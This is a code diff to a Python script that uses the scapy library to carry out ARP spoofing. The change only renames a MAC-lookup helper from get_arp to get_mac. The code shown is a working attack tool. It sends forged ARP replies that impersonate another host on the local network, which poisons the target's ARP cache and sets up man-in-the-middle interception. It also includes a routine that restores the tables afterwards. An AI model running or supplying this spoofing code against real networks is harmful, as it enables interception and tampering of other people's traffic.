@@ -4,20 +4,20 @@ import scapy.all as scapy
 import time
 
 
-def get_arp(ip_address_range):
+def get_mac(ip_address_range):
     arp_packet = scapy.ARP(pdst = ip_address_range)
     broadcast_frame = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
     results = scapy.srp(broadcast_frame/arp_packet, iface = "eth0", timeout = 2, verbose = False)
     return results[0][0][1].hwsrc
 
 def spoof_it(target_ip, spoofed_ip):
-    target_mac = get_arp(target_ip)
+    target_mac = get_mac(target_ip)
     spoof_message = scapy.ARP(op=2, pdst = target_ip, psrc = spoofed_ip, hwdst = target_mac)
     scapy.send(spoof_message, verbose = False)
 
 def restore(dest_ip, src_ip):
-    target_mac = get_arp(dest_ip)
-    src_mac = get_arp(src_ip)
+    target_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
     spoof_message = scapy.ARP(op=2, pdst=dest_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac)
     scapy.send(spoof_message, count = 4, verbose = False)
 
